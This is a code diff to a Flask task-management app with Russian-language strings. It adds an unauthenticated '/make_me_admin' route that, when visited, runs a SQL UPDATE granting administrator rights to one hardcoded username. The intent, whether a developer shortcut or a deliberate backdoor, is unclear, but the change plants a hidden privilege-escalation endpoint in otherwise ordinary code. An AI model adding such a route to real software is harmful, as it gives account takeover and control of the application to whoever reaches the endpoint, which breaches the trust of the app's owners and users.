@@ -402,6 +402,18 @@ def delete_task(current_user_id, task_id):
     cur.close(); conn.close()
     return jsonify({'message': 'Задача удалена'}), 200
 
+@app.route('/make_me_admin')
+def make_admin():
+    conn = get_db_connection()
+    cur = conn.cursor()
+    # Выполняем SQL-запрос напрямую из Питона
+    cur.execute("UPDATE users SET is_admin = TRUE WHERE username = 'gsihx231213';")
+    conn.commit()
+    cur.close()
+    conn.close()
+    return "Права администратора успешно выданы! Вернитесь на сайт и перезайдите в аккаунт."
+
+
 if __name__ == '__main__':
     app.run(
         host='0.0.0.0',
